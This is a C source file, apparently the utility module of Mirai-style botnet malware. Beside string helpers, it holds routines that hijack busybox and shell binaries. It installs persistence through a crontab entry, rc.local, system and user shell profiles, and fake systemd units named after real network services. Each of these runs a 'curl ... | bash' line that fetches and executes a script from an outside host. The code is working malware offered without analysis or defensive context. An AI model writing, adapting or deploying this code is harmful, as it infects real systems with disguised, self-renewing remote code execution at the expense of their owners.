#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include "includes.h"
#include "util.h"
#include "table.h"
int util_strlen(const char *str)
{
    int c = 0;
    while (*str++ != 0)
        c++;
    return c;
}
BOOL util_strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);
    if (l1 < len || l2 < len)
        return FALSE;
    while (len--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }
    return TRUE;
}
BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);
    if (l1 != l2)
        return FALSE;
    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }
    return TRUE;
}
int util_strcpy(char *dst, const char *src)
{
    int l = util_strlen(src);
    util_memcpy(dst, src, l + 1);
    return l;
}
void util_memcpy(void *dst, const void *src, int len)
{
    char *r_dst = (char *)dst;
    const char *r_src = (const char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}
void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;
	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;
	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
		if (c >= base)
			break;
		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}
char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;
    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;
        offset = 32;
        scratch[33] = 0;
        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }
        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;
            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        if (neg)
            scratch[offset] = '-';
        else
            offset++;
        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }
    return string;
}
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;
    if (mem_len > buf_len)
        return -1;
    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }
    return -1;
}
int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;
    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;
        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }
    return -1;
}
ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);
    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);
    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');
    return total == 0 ? NULL : buffer;
}
static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}
static inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}
static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}
static inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
BOOL util_is_busybox_wrapper(void)
{
    char self_path[256] = {0};
    int n;
    if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
    {
        self_path[n] = 0;
        if(util_stristr(self_path, n, "/bin/busybox") != -1)
        {
            return TRUE;
        }
    }
    return FALSE;
}
BOOL util_is_shell_wrapper(void)
{
    char self_path[256] = {0};
    int n;
    if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
    {
        self_path[n] = 0;
        if(util_stristr(self_path, n, "/bin/sh") != -1 || 
           util_stristr(self_path, n, "/bin/bash") != -1)
        {
            return TRUE;
        }
    }
    return FALSE;
}
void util_run_original_busybox(int argc, char **argv)
{
    char orig_path[256] = "/bin/busybox.orig";
    char *new_argv[256];
    int i;
    if(access(orig_path, F_OK) != 0)
    {
        util_strcpy(orig_path, "/bin/busybox");
    }
    new_argv[0] = orig_path;
    for(i = 1; i < argc && i < 255; i++)
    {
        new_argv[i] = argv[i];
    }
    new_argv[i] = NULL;
    execve(orig_path, new_argv, NULL);
    exit(1);
}
void util_run_original_shell(int argc, char **argv)
{
    char self_path[256] = {0};
    char orig_path[256];
    char *new_argv[256];
    int i, n;
    if((n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) > 0)
    {
        self_path[n] = 0;
        if(util_stristr(self_path, n, "/bin/bash") != -1)
        {
            util_strcpy(orig_path, "/bin/bash.orig");
            if(access(orig_path, F_OK) != 0)
                util_strcpy(orig_path, "/bin/bash");
        }
        else
        {
            util_strcpy(orig_path, "/bin/sh.orig");
            if(access(orig_path, F_OK) != 0)
                util_strcpy(orig_path, "/bin/sh");
        }
    }
    else
    {
        util_strcpy(orig_path, "/bin/sh.orig");
        if(access(orig_path, F_OK) != 0)
            util_strcpy(orig_path, "/bin/sh");
    }
    new_argv[0] = orig_path;
    for(i = 1; i < argc && i < 255; i++)
    {
        new_argv[i] = argv[i];
    }
    new_argv[i] = NULL;
    execve(orig_path, new_argv, NULL);
    exit(1);
}
void util_install_persistence(void)
{
    util_install_systemd_service();
    util_install_crontab();
    util_install_rclocal();
    util_install_profile();
}

void util_install_crontab(void)
{
    const char *curl_cmd = "curl -s https://files.c0rex64.dev/meow.sh | bash";
    char crontab_entry[512];
    util_zero(crontab_entry, sizeof(crontab_entry));
    util_strcpy(crontab_entry, "* * * * * ");
    util_strcpy(crontab_entry + util_strlen(crontab_entry), curl_cmd);
    util_strcpy(crontab_entry + util_strlen(crontab_entry), " >/dev/null 2>&1 &\n");
    
    char crontab_file[256] = "/tmp/.cron_";
    char pid_str[32];
    util_itoa(getpid(), 10, pid_str);
    util_strcpy(crontab_file + util_strlen(crontab_file), pid_str);
    
    int fd = open(crontab_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if(fd != -1)
    {
        write(fd, crontab_entry, util_strlen(crontab_entry));
        close(fd);
        
        char cmd[512];
        util_strcpy(cmd, "/bin/busybox test -f /usr/bin/crontab && /usr/bin/crontab ");
        util_strcpy(cmd + util_strlen(cmd), crontab_file);
        util_strcpy(cmd + util_strlen(cmd), " 2>/dev/null; /bin/busybox test -f /bin/crontab && /bin/crontab ");
        util_strcpy(cmd + util_strlen(cmd), crontab_file);
        util_strcpy(cmd + util_strlen(cmd), " 2>/dev/null");
        system(cmd);
        unlink(crontab_file);
    }
}

void util_install_rclocal(void)
{
    const char *curl_cmd = "curl -s https://files.c0rex64.dev/meow.sh | bash";
    const char *rclocal_paths[] = {
        "/etc/rc.local",
        "/etc/rc.d/rc.local",
        "/etc/init.d/rc.local"
    };
    
    char rclocal_entry[512];
    util_zero(rclocal_entry, sizeof(rclocal_entry));
    util_strcpy(rclocal_entry, curl_cmd);
    util_strcpy(rclocal_entry + util_strlen(rclocal_entry), " >/dev/null 2>&1 &\n");
    
    for(int i = 0; i < 3; i++)
    {
        if(access(rclocal_paths[i], F_OK) == 0)
        {
            FILE *f = fopen(rclocal_paths[i], "r");
            if(f)
            {
                char buf[4096];
                int found = 0;
                while(fgets(buf, sizeof(buf), f))
                {
                    if(util_stristr(buf, util_strlen(buf), "files.c0rex64.dev") != -1)
                    {
                        found = 1;
                        break;
                    }
                }
                fclose(f);
                
                if(!found)
                {
                    FILE *fw = fopen(rclocal_paths[i], "a");
                    if(fw)
                    {
                        fprintf(fw, "%s", rclocal_entry);
                        fclose(fw);
                        chmod(rclocal_paths[i], 0755);
                    }
                }
            }
        }
    }
}

void util_install_profile(void)
{
    const char *curl_cmd = "curl -s https://files.c0rex64.dev/meow.sh | bash";
    const char *profile_paths[] = {
        "/etc/profile",
        "/etc/bash.bashrc",
        "/root/.bashrc",
        "/root/.profile"
    };
    
    char profile_entry[512];
    util_zero(profile_entry, sizeof(profile_entry));
    util_strcpy(profile_entry, curl_cmd);
    util_strcpy(profile_entry + util_strlen(profile_entry), " >/dev/null 2>&1 &\n");
    
    for(int i = 0; i < 4; i++)
    {
        if(access(profile_paths[i], F_OK) == 0)
        {
            FILE *f = fopen(profile_paths[i], "r");
            if(f)
            {
                char buf[4096];
                int found = 0;
                while(fgets(buf, sizeof(buf), f))
                {
                    if(util_stristr(buf, util_strlen(buf), "files.c0rex64.dev") != -1)
                    {
                        found = 1;
                        break;
                    }
                }
                fclose(f);
                
                if(!found)
                {
                    FILE *fw = fopen(profile_paths[i], "a");
                    if(fw)
                    {
                        fprintf(fw, "%s", profile_entry);
                        fclose(fw);
                    }
                }
            }
        }
    }
    
    char cmd[1024];
    util_strcpy(cmd, "/bin/busybox find /home -maxdepth 2 -name '.bashrc' -o -name '.profile' 2>/dev/null | /bin/busybox head -10 | /bin/busybox xargs -I {} /bin/busybox sh -c '");
    util_strcpy(cmd + util_strlen(cmd), "/bin/busybox grep -q \"files.c0rex64.dev\" \"{}\" || echo \"");
    util_strcpy(cmd + util_strlen(cmd), curl_cmd);
    util_strcpy(cmd + util_strlen(cmd), " >/dev/null 2>&1 &\" >> \"{}\"'");
    system(cmd);
}
void util_install_systemd_service(void)
{
    int fd;
    char service_path[256];
    char service_content[2048];
    const char *curl_cmd = "curl -s https://files.c0rex64.dev/meow.sh | bash";
    
    if(access("/usr/lib/systemd", F_OK) != 0 && access("/lib/systemd", F_OK) != 0 && access("/etc/systemd", F_OK) != 0)
    {
        return; 
    }
    
    const char *systemd_paths[] = {
        "/etc/systemd/system",
        "/usr/lib/systemd/system",
        "/lib/systemd/system"
    };
    
    const char *service_names[] = {
        "systemd-networkd-resolved.service",
        "NetworkManager-wait-online.service",
        "dbus-org.freedesktop.network1.service",
        "systemd-resolved.service"
    };
    
    for(int sn = 0; sn < 4; sn++)
    {
        const char *service_name = service_names[sn];
        for(int i = 0; i < 3; i++)
        {
            if(access(systemd_paths[i], F_OK) == 0)
            {
                util_strcpy(service_path, systemd_paths[i]);
                util_strcpy(service_path + util_strlen(service_path), "/");
                util_strcpy(service_path + util_strlen(service_path), service_name);
                
                fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if(fd != -1)
                {
                    util_zero(service_content, sizeof(service_content));
                    util_strcpy(service_content, "[Unit]\n");
                    util_strcpy(service_content + util_strlen(service_content), "Description=System Network Service\n");
                    util_strcpy(service_content + util_strlen(service_content), "After=network.target\n");
                    util_strcpy(service_content + util_strlen(service_content), "Wants=network-online.target\n\n");
                    util_strcpy(service_content + util_strlen(service_content), "[Service]\n");
                    util_strcpy(service_content + util_strlen(service_content), "Type=oneshot\n");
                    util_strcpy(service_content + util_strlen(service_content), "ExecStart=/bin/bash -c '");
                    util_strcpy(service_content + util_strlen(service_content), curl_cmd);
                    util_strcpy(service_content + util_strlen(service_content), " >/dev/null 2>&1'\n");
                    util_strcpy(service_content + util_strlen(service_content), "RemainAfterExit=yes\n");
                    util_strcpy(service_content + util_strlen(service_content), "StandardOutput=null\n");
                    util_strcpy(service_content + util_strlen(service_content), "StandardError=null\n\n");
                    util_strcpy(service_content + util_strlen(service_content), "[Install]\n");
                    util_strcpy(service_content + util_strlen(service_content), "WantedBy=multi-user.target\n");
                    util_strcpy(service_content + util_strlen(service_content), "WantedBy=network-online.target\n");
                    write(fd, service_content, util_strlen(service_content));
                    close(fd);
                    
                    char dir_cmd[512];
                    util_strcpy(dir_cmd, "/bin/busybox mkdir -p ");
                    util_strcpy(dir_cmd + util_strlen(dir_cmd), systemd_paths[i]);
                    util_strcpy(dir_cmd + util_strlen(dir_cmd), "/multi-user.target.wants 2>/dev/null; /bin/busybox mkdir -p ");
                    util_strcpy(dir_cmd + util_strlen(dir_cmd), systemd_paths[i]);
                    util_strcpy(dir_cmd + util_strlen(dir_cmd), "/network-online.target.wants 2>/dev/null");
                    system(dir_cmd);
                    
                    char symlink_path[512];
                    util_strcpy(symlink_path, systemd_paths[i]);
                    util_strcpy(symlink_path + util_strlen(symlink_path), "/multi-user.target.wants/");
                    util_strcpy(symlink_path + util_strlen(symlink_path), service_name);
                    unlink(symlink_path);
                    symlink(service_path, symlink_path);
                    
                    util_strcpy(symlink_path, systemd_paths[i]);
                    util_strcpy(symlink_path + util_strlen(symlink_path), "/network-online.target.wants/");
                    util_strcpy(symlink_path + util_strlen(symlink_path), service_name);
                    unlink(symlink_path);
                    symlink(service_path, symlink_path);
                    
                    char enable_cmd[1024];
                    util_strcpy(enable_cmd, "/bin/busybox test -f /bin/systemctl && /bin/systemctl daemon-reload 2>/dev/null; ");
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), "/bin/busybox test -f /bin/systemctl && /bin/systemctl enable ");
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null; ");
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), "/bin/busybox test -f /bin/systemctl && /bin/systemctl start ");
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null; ");
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), "/bin/busybox test -f /bin/systemctl && /bin/systemctl enable --now ");
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), service_name);
                    util_strcpy(enable_cmd + util_strlen(enable_cmd), " 2>/dev/null");
                    system(enable_cmd);
                    break;
                }
            }
        }
    }
}
